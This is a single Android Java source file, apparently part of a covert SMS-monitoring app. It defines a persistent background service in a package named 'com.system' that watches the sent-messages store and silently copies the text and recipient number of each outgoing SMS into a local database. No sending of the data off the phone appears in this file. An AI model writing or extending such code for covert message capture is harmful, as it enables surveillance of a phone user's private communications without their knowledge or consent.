package com.system;

import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;

/**
 * Created by Shahnawaz on 5/6/2016.
 */
public class OutService extends Service {
    MyObserver observer;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        observer = new MyObserver(new Handler());
        Uri uriSMSURI = Uri.parse("content://sms/sent");
        getApplicationContext().getContentResolver().registerContentObserver(uriSMSURI, false, observer);
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        getApplicationContext().getContentResolver().unregisterContentObserver(observer);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return START_STICKY;
    }

    public class MyObserver extends ContentObserver {

        public MyObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse("content://sms/sent");
            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
            if (cur != null && cur.moveToNext()) {
                String content = cur.getString(cur.getColumnIndex("body"));
                String smsNumber = cur.getString(cur.getColumnIndex("address"));
                cur.close();

                new DataBase(getApplicationContext()).insertMessage(content, smsNumber, false);
            }

        }
    }
}
